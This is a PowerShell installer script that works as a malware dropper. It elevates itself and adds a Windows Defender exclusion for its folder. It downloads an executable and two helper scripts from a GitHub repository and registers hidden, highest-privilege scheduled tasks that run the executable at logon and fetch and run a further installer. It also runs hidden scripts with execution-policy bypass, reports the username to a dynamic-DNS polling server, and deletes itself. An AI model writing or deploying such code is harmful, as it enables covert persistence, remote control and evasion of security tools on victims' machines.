$ErrorActionPreference = "Continue"

$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
$self = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
$runDir = "$env:APPDATA\run"
$runExe = "$runDir\run.exe"
$installDir = "$env:TEMP\run"
$installer = "$installDir\ss_installer.ps1"
$ssControl = "$installDir\ss_control.ps1"
$datDir = "$env:APPDATA\Microsoft\run"
$datFile = "$datDir\run.dat"

$isUpdate = Test-Path $datFile
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
  [Security.Principal.WindowsBuiltInRole]::Administrator
)

if (-not $isUpdate -and -not $isAdmin) {
  Start-Process `
    -FilePath $self `
    -Verb RunAs
  exit
}

if (-not $isUpdate) {
  Add-MpPreference -ExclusionPath $runDir | Out-Null
}

if (-not (Test-Path $datDir)) {
  New-Item -ItemType Directory -Path $datDir -Force | Out-Null
}

New-Item -ItemType Directory -Path "$env:TEMP" -Force | Out-Null
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

Get-Process -Name "run" -ErrorAction SilentlyContinue |
  Stop-Process -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2
New-Item -ItemType Directory -Path $runDir -Force | Out-Null

$ghHeaders = @{ "User-Agent" = "PowerShell-Installer" }

try {
  $apiResponse = Invoke-RestMethod `
    -Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop

  $latestCommit = $apiResponse.sha
}
catch {
  $latestCommit = "main"
}

try {
  Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/run.exe" `
    -OutFile $runExe `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop
}
catch {
  exit
}

try {
  Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_installer.ps1" `
    -OutFile $installer `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop
}
catch {
  exit
}

try {
  Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_control.ps1" `
    -OutFile $ssControl `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop
}
catch {
  exit
}

if (
  -not (Test-Path $runExe) -or
  -not (Test-Path $installer) -or
  -not (Test-Path $ssControl)
) {
  exit
}

$taskName = "WinRun"
$action = New-ScheduledTaskAction `
  -Execute $runExe `
  -WorkingDirectory $runDir

$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Days 365)

$cmd = 'powershell.exe -Command "$p="$env:APPDATA\run"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; $h=@{''User-Agent''=''PowerShell-Updater''}; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'' -Headers $h).sha; $o="$p\installer.exe"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$sha/installer.exe" -OutFile $o -Headers $h -UseBasicParsing; Start-Process -FilePath $o -WindowStyle Hidden"'

$installerTaskName = "WinRunInstaller"
$installerAction = New-ScheduledTaskAction `
  -Execute "powershell.exe" `
  -Argument " -Command $cmd"

$installerSettings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
  -Hidden

Register-ScheduledTask `
  -TaskName $taskName `
  -Action $action `
  -Trigger $trigger `
  -Settings $settings `
  -RunLevel Highest `
  -Force | Out-Null

Register-ScheduledTask `
  -TaskName $installerTaskName `
  -Action $installerAction `
  -Settings $installerSettings `
  -RunLevel Highest `
  -Force | Out-Null

Start-Process powershell.exe `
  -ArgumentList @(
  '-NoProfile',
  '-ExecutionPolicy',
  'Bypass',
  '-File',
  $installer
) -WindowStyle Hidden -Wait

$latestCommit | Out-File $datFile

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"

try {
  $registerUrl = $VPS_POLL_URL + "?username=" + $uniqueUser
  $testUri = [System.Uri]$registerUrl

  Invoke-RestMethod `
    -Method Get `
    -Uri $registerUrl `
    -Headers $ghHeaders `
    -ErrorAction Stop | Out-Null
}
catch {
}

Start-Process `
  -FilePath $runExe

Start-Process powershell.exe `
  -ArgumentList @(
  '-NoProfile',
  '-ExecutionPolicy',
  'Bypass',
  '-File',
  $ssControl
) -WindowStyle Hidden

if ($installer) {
  Start-Process powershell.exe `
    -ArgumentList @(
    "-Command",
    "Start-Sleep 2; Remove-Item '$installer' -Force -ErrorAction SilentlyContinue"
  ) -WindowStyle Hidden
}

if ($self) {
  Start-Process powershell.exe `
    -ArgumentList @(
    "-Command",
    "Start-Sleep 4; Remove-Item '$self' -Force -ErrorAction SilentlyContinue"
  ) `
    -WindowStyle Hidden
}
